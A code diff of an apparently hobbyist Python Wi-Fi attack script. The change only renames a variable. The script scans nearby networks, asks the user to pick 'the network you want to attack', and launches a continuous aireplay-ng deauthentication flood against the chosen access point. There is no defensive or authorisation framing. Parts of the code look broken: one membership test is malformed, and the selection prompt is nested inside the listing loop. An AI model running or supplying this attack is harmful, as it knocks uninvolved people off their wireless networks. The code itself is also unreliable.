@@ -99,20 +99,20 @@ try:
                             pass
                         elif row in ['BSID'] == 'Station MAC': ## GETS RID OF CLIENT DATA.
                             break
-                        elif check_ssid(row['ESSID'], active_wireless_networks):
-                            active_wireless_networks.append(row)
+                        elif check_ssid(row['ESSID'], ACTIVE_NETWORKS):
+                            ACTIVE_NETWORKS.append(row)
             print(f'[SYSTEM] Scanning. Press control+ when you want to select the network you want to attack.\n' )
             print("No |\tBSSID              |\tChannel|\tESSID                         |")
             print("___|\t___________________|\t_______|\t______________________________|")
 
-            for index, item in enumerate(active_wireless_networks):
+            for index, item in enumerate(ACTIVE_NETWORKS):
                 print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
                 while True:
                     choice = input("[SYSTEM] Please make a choice from above. ")
                     try:
-                        if active_wireless_networks[int(choice)]:
-                            hack_ssid = active_wireless_networks[int(choice)]["BSSID"]
-                            hack_channel = active_wireless_networks[int(choice)]["channel"].strip()
+                        if ACTIVE_NETWORKS[int(choice)]:
+                            hack_ssid = ACTIVE_NETWORKS[int(choice)]["BSSID"]
+                            hack_channel = ACTIVE_NETWORKS[int(choice)]["channel"].strip()
                             subprocess.run(["airmon-ng", "start", nic + "mon", hack_channel])
                             subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hack_ssid,
                             wifi_result[int(wifi_interface_choice)] + "mon"])
